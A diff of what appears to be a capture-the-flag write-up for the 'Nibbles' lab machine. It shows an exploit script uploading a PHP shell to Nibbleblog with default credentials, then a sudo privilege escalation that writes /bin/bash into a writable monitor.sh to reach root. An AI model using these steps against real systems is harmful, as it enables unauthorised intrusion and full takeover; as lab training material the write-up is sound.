@@ -111,17 +111,14 @@ exploit.py                                                 100%[================
 
 2025-04-26 07:00:51 (52.1 MB/s) - ‘exploit.py’ saved [1932/1932]
 
-
 └─$ python3.13 exploit.py
 usage: exploit.py [-h] --url URL --username USERNAME --password PASSWORD --payload PAYLOAD
 exploit.py: error: the following arguments are required: --url/-l, --username/-u, --password/-p, --payload/-x
-
 
 └─$ python3.13 exploit.py -l http://10.129.96.84/nibbleblog/ -u admin -p nibbles -x shell.php
 [+] Login Successful.
 [+] Upload likely successfull.
 [+] Exploit launched, check for shell.
-
 
 └─$ curl http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php
 ```
@@ -172,52 +169,29 @@ nibbler@Nibbles:/$ ls /home/nibbler
 ls /home/nibbler
 personal.zip  user.txt
 
-
 nibbler@Nibbles:/$ mkdir -p /home/nibbler/personal/stuff
 mkdir -p /home/nibbler/personal/stuff
-
 
 nibbler@Nibbles:/$ echo '# !/bin/bash' > /home/nibbler/personal/stuff/monitor.sh
 <!/bin/bash' > /home/nibbler/personal/stuff/monitor.sh
 
-
 nibbler@Nibbles:/$ echo '/bin/bash' >> /home/nibbler/personal/stuff/monitor.sh
 <in/bash' >> /home/nibbler/personal/stuff/monitor.sh
-
 
 nibbler@Nibbles:/$ cat /home/nibbler/personal/stuff/monitor.sh
 cat /home/nibbler/personal/stuff/monitor.sh
 # !/bin/bash
 /bin/bash
 
-
-nibbler@Nibbles:/$ ls -l /home/nibbler/personal/stuff/monitor.sh
-ls -l /home/nibbler/personal/stuff/monitor.sh
--rw-rw-rw- 1 nibbler nibbler 23 Apr 27 02:20 /home/nibbler/personal/stuff/monitor.sh
-
-
 nibbler@Nibbles:/$ chmod +x home/nibbler/personal/stuff/monitor.sh
 chmod +x home/nibbler/personal/stuff/monitor.sh
-
-
-nibbler@Nibbles:/$ ls -l /home/nibbler/personal/stuff/monitor.sh
-ls -l /home/nibbler/personal/stuff/monitor.sh
--rwxrwxrwx 1 nibbler nibbler 23 Apr 27 02:20 /home/nibbler/personal/stuff/monitor.sh
-
-
-nibbler@Nibbles:/$ id
-id
-uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
-
 
 nibbler@Nibbles:/$ sudo /home/nibbler/personal/stuff/monitor.sh
 sudo /home/nibbler/personal/stuff/monitor.sh
 
-
 root@Nibbles:/# id
 id
 uid=0(root) gid=0(root) groups=0(root)
-
 
 cat /root/root.txt 
 a042d31cafc2461bbf2ba0b2c99fdca8
